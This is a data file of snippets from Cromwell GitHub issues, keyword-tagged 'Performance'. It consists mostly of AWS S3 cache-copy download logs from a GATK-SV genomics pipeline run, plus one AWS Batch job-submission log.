s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-97/cacheCopy/SR00c.HG03872.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:59919,cache,cacheCopy,59919,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz; 1608597241175,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-154/cacheCopy/SR00c.NA21102.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-154/cacheCopy/SR00c.NA21102.txt.gz.tbi; 1608597243204,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-14/cacheCopy/SR00c.HG00557.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-14/cacheCopy/SR00c.HG00557.txt.gz.tbi; 1608597245149,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-144/cacheCopy/SR00c.NA20346.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:82969,cache,cacheCopy,82969,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-alignandmolvar:1.3.2; [2019-05-22 19:19:19,34] [info] jobQueueArn: arn:aws:batch:us-east-1:260062248592:job-queue/GenomicsDefaultQueue-80d8b8f0-15ed-11e9-b8b7-12ddf705bbc4; [2019-05-22 19:19:19,34] [info] taskId: Haplotypecaller.HC_GVCF-Some(1)-1; [2019-05-22 19:19:19,34] [info] hostpath root: hc.Haplotypecaller/hc.HC_GVCF/755021ae-948b-47f9-94a8-66b486bda47d/Some(1)/1; ...; [2019-05-22 19:19:19,34] [info] Submitting job to AWS Batch; [2019-05-22 19:19:19,34] [info] dockerImage: 260062248592.dkr.ecr.us-east-1.amazonaws.com/s4-alignandmolvar:1.3.2; [2019-05-22 19:19:19,34] [info] jobQueueArn: arn:aws:batch:us-east-1:260062248592:job-queue/GenomicsDefaultQueue-80d8b8f0-15ed-11e9-b8b7-12ddf705bbc4; [2019-05-22 19:19:19,34] [info] taskId: Haplotypecaller.HC_GVCF-Some(6)-1; [2019-05-22 19:19:19,34] [info] hostpath root: hc.Haplotypecaller/hc.HC_GVCF/755021ae-948b-47f9-94a8-66b486bda47d/Some(6)/1; ...; [2019-05-22 19:19:19,51] [warn] Job definition already exists. Performing describe and retrieving latest revision.; [2019-05-22 19:19:21,71] [info] AwsBatchAsyncBackendJobExecutionActor [755021aeHaplotypecaller.HC_GVCF:1:1]: job id: 45a77017-89a7-45c0-8b8b-d40ae2420212; [2019-05-22 19:19:21,76] [info] AwsBatchAsyncBackendJobExecutionActor [755021aeHaplotypecaller.HC_GVCF:1:1]: Status change from - to Initializing; [2019-05-22 19:19:26,71] [info] AwsBatchAsyncBackendJobExecutionActor [755021aeHaplotypecaller.HC_GVCF:6:1]: job id: 7c2d29c2-f04e-4b3f-8579-915a6fbc9033; [2019-05-22 19:19:26,76] [info] AwsBatchAsyncBackendJobExecutionActor [755021aeHaplotypecaller.HC_GVCF:6:1]: Status change from - to Initializing; [2019-05-22 19:19:27,42] [info] AwsBatchAsyncBackendJobExecutionActor [755021aeHaplotypecaller.HC_GVCF:6:1]: Status change from Initializing to Running; ...; [2019-05-22 19:21:09,63] [info] AwsBatchAsyncBackendJobExecutionActor [755021aeHaplotypecaller.HC_GVCF:1:1]: Status change from Initializing to Running; ...; [2019-05-22 19:22:43,83] [info] AwsBatchAsyncBackend",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5004:9089,Perform,Performing,9089,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5004,1,['Perform'],['Performing']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-101/cacheCopy/SR00c.HG04161.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-101/cacheCopy/SR00c.HG04161.txt.gz.tbi; 1608597371711,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-48/cacheCopy/SR00c.HG02020.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-48/cacheCopy/SR00c.HG02020.txt.gz; 1608597374474,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-83/cacheCopy/SR00c.HG03476.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-83/cacheCopy/SR00c.HG03476.txt.gz; 1608597376806,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:117556,cache,cacheCopy,117556,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-105/cacheCopy/SR00c.NA11894.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-105/cacheCopy/SR00c.NA11894.txt.gz.tbi; 1608596983896,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz; 1608596985970,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-28/cacheCopy/SR00c.HG01393.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-28/cacheCopy/SR00c.HG01393.txt.gz.tbi; 1608596987867,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evide",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:12840,cache,cacheCopy,12840,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-106/cacheCopy/SR00c.NA12340.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-106/cacheCopy/SR00c.NA12340.txt.gz.tbi; 1608597085601,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-32/cacheCopy/SR00c.HG01572.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-32/cacheCopy/SR00c.HG01572.txt.gz; 1608597087902,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-104/cacheCopy/SR00c.NA10847.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-104/cacheCopy/SR00c.NA10847.txt.gz.tbi; 1608597089027,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:40272,cache,cacheCopy,40272,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-109/cacheCopy/SR00c.NA18499.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-109/cacheCopy/SR00c.NA18499.txt.gz.tbi; 1608597136464,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-14/cacheCopy/SR00c.HG00557.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-14/cacheCopy/SR00c.HG00557.txt.gz; 1608597138537,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-118/cacheCopy/SR00c.NA18941.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-118/cacheCopy/SR00c.NA18941.txt.gz.tbi; 1608597141037,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:54615,cache,cacheCopy,54615,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-110/cacheCopy/SR00c.NA18507.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-110/cacheCopy/SR00c.NA18507.txt.gz.tbi; 1608597115454,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz; 1608597116706,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-132/cacheCopy/SR00c.NA19449.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-132/cacheCopy/SR00c.NA19449.txt.gz.tbi; 1608597118429,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:48371,cache,cacheCopy,48371,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-111/cacheCopy/SR00c.NA18530.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-111/cacheCopy/SR00c.NA18530.txt.gz.tbi; 1608596958265,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz; 1608596960348,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz.tbi; 1608596962113,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evide",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:5346,cache,cacheCopy,5346,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-120/cacheCopy/SR00c.NA18956.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-120/cacheCopy/SR00c.NA18956.txt.gz.tbi; 1608596968605,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-37/cacheCopy/SR00c.HG01794.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-37/cacheCopy/SR00c.HG01794.txt.gz; 1608596971072,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-31/cacheCopy/SR00c.HG01507.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-31/cacheCopy/SR00c.HG01507.txt.gz.tbi; 1608596972311,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evide",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:8473,cache,cacheCopy,8473,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-122/cacheCopy/SR00c.NA19001.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-122/cacheCopy/SR00c.NA19001.txt.gz.tbi; 1608597093130,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-89/cacheCopy/SR00c.HG03709.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-89/cacheCopy/SR00c.HG03709.txt.gz; 1608597095782,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-91/cacheCopy/SR00c.HG03727.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-91/cacheCopy/SR00c.HG03727.txt.gz; 1608597098791,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:42776,cache,cacheCopy,42776,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-123/cacheCopy/SR00c.NA19035.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-123/cacheCopy/SR00c.NA19035.txt.gz.tbi; 1608597424089,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-25/cacheCopy/SR00c.HG01344.txt.gz to 